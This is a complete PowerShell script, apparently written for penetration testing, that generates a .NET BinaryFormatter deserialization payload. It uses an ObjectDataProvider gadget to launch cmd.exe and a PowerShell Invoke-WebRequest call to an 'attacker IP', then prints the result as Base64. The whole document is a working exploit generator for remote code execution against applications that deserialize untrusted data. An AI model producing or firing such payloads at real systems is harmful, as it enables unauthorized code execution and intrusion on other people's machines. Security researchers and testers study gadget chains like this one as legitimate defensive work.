# 1. Load the required assembly
Add-Type -AssemblyName PresentationFramework

# 2. Define your attacker IP and the URL
$attackerIP = "192.168.1.100" # <--- CHANGE THIS TO YOUR IP
$targetURL = "http://$attackerIP/"

# 3. Create the ObjectDataProvider gadget
$odp = New-Object System.Windows.Data.ObjectDataProvider

# 4. Set the ObjectType (NOT ObjectInstance) to invoke a static method
$odp.ObjectType = [System.Diagnostics.Process]

# 5. Add MethodParameters BEFORE setting MethodName (Order is critical)
$odp.MethodParameters.Add("cmd.exe")

# The command: cmd.exe /c powershell.exe -c "Invoke-WebRequest -Uri http://<IP>/ -UseBasicParsing"
$command = "/c powershell.exe -c ""Invoke-WebRequest -Uri $targetURL -UseBasicParsing"""
$odp.MethodParameters.Add($command)

# 6. Set the MethodName
$odp.MethodName = "Start"

# 7. Serialize the gadget using BinaryFormatter
$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
$memStream = New-Object System.IO.MemoryStream
$formatter.Serialize($memStream, $odp)

# 8. Convert the serialized bytes to a Base64 string
$base64Payload = [System.Convert]::ToBase64String($memStream.ToArray())

# 9. Output the payload
Write-Host "Base64 Payload (HTTP Request to $attackerIP):" -ForegroundColor Green
Write-Host $base64Payload

# Clean up
$memStream.Dispose()
